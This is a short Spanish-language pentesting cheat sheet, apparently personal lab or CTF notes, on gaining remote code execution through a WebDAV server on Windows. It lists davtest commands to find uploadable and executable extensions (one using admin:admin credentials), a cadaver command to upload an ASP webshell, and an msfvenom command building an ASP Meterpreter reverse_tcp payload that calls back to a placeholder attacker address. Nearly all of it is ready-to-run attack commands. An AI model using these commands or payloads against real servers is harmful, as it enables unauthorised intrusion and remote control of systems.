--------------
- tags: #web #windows #cadaver #davtest #fileupload #rce 
--------------

## davtest
> davtest sirve para hacer un chequeo sobre que extensiones de archivo se pueden subir y cuales son ejecutadas. Una vez tenemos esta información podemos usar cadaver para ganar RCE

	davtest -url http://x.x.x.x/webdav

	davtest -auth admin:admin -url http://x.x.x.x/webdav


## cadaver

	cadaver http://x.x.x.x/webdav
(Al ejecutar este comando nos pedirá el usuario y la contraseña)

	put /usr/share/webshells/asp/webshell.asp


## Payload con msfvenom

	msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f asp -o shell.asp






